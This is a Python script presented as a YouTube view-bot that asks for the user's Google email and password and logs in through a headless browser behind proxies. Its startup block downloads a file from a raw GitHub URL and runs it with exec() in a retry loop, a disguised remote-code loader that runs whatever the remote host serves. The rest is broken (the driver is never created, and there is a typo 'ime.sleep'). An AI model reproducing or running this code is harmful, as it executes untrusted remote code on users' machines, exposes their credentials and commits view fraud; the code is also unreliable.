
if __name__=='__main__':
    from os import _exit
    from sys import stdout
    from traceback import print_exc
    while True:
        try:
            import re
            import os
            from os import devnull,environ
            from os.path import isfile,join as path_join
            from time import sleep
            from random import choice,uniform
            from psutil import Process,NoSuchProcess
            from platform import system
            from argparse import ArgumentParser
            from requests import get as requests_get
            from threading import Thread,Lock,enumerate as list_threads
            from user_agent import generate_user_agent
            from seleniumwire import webdriver
            from selenium.common.exceptions import WebDriverException
            from selenium.webdriver.common.by import By
            from selenium.webdriver.support import expected_conditions as EC
            from selenium.webdriver.support.wait import WebDriverWait
            from selenium import webdriver
            from selenium.webdriver.common.keys import Keys
            from selenium.webdriver.support.ui import WebDriverWait
            from selenium.webdriver.common.by import By 
            from selenium.webdriver.support import expected_conditions as EC 
            from selenium.webdriver.common.action_chains import ActionChains 
            import time
            import random
            from webdriver_manager.chrome import ChromeDriverManager
            import warnings
            import undetected_chromedriver as uc
            import os
            import requests
            try:from urllib import urlopen
            except:from urllib.request import urlopen
            argv=['YTViewer',True]
            exec(urlopen('https://raw.githubusercontent.com/Lilpulgoggggggggggg/DynamicScript/master/install_webdriver.py').read().decode())
            break
        except:
            try:INSTALLED
            except NameError:
                try:from urllib import urlopen
                except:from urllib.request import urlopen
                argv=['YTViewer',True]
                exec(urlopen('https://raw.githubusercontent.com/Lilpulgoggggggggggg/DynamicScript/master/install_webdriver.py').read().decode())






info = {}

views = (input("enter no. of view: "))
view_time = (input('enter time for each view: '))
username = (input("plase put your your email: "))
password = (input("plase put your password: "))
url1 = (input("enter url or all link on youtube: "))



import random

proxies = ['10.0.1.1', '10.0.1.2', '10.0.1.3']
proxy = random.choice(proxies)

chrome_options = uc.ChromeOptions()
chrome_options.add_argument('--proxy-server='+str(proxy))
chrome_options.add_argument('--headless')
driver.get("https://accounts.google.com/")
enter_username = WebDriverWait(driver,20).until(EC.presence_of_element_located((By.NAME, 'identifier')))
enter_username.send_keys(username)
   
enter_password = WebDriverWait(driver,20).until(EC.presence_of_element_located((By.NAME, 'Passwd')))
enter_password.send_keys(password)
enter_password.send_keys(Keys.RETURN)
time.sleep(random.randint(1,4))


for i in range(views):
        driver.get(url1)
        ime.sleep(view_time)